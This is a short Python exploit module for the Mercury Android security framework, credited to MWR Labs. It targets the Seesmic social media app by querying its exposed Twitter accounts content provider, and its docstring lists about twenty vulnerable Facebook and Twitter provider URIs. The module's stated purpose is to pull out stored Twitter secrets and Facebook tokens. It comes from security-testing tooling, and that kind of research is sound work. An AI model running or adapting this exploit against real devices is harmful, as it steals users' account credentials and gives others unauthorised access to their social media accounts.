from merc.lib.modules import Module
class seesmic_secret(Module):
    """Extracts Twitter Secret and Facebook Token from Seesmic's vulnerable content providers
https://play.google.com/store/apps/details?id=com.seesmic&hl=en
Vulnerable Content Providers:
================================================
content://com.seesmic.aggregate/aggregate_authors
content://com.seesmic.aggregate/aggregate_timelines
content://com.seesmic.facebook/facebook_authors
content://com.seesmic.facebook/facebook_friendlists
content://com.seesmic.facebook/facebook_page_profiles
content://com.seesmic.facebook/facebook_people
content://com.seesmic.facebook/facebook_profiles
content://com.seesmic.facebook/facebook_updates
content://com.seesmic.twitter/accounts
content://com.seesmic.twitter/attachs
content://com.seesmic.twitter/authors
content://com.seesmic.twitter/dm
content://com.seesmic.twitter/list_info
content://com.seesmic.twitter/lists
content://com.seesmic.twitter/mute
content://com.seesmic.twitter/search_results
content://com.seesmic.twitter/searches
content://com.seesmic.twitter/topics
content://com.seesmic.twitter/tweets
content://com.seesmic.twitter/userlists
content://com.seesmic.twitter/users

Henry Hoggard - MWRLabs"""
    
    def __init__(self, *args, **kwargs):
        Module.__init__(self, *args, **kwargs)
        self.path = ["exploit", "pilfer", "thirdparty"]

    def execute(self, session, _arg):
	request = {}
        request['Uri'] = "content://com.seesmic.twitter/accounts"
        request['showColumns'] = "true"

        print session.executeCommand("provider", "query", request).getPaddedErrorOrData()

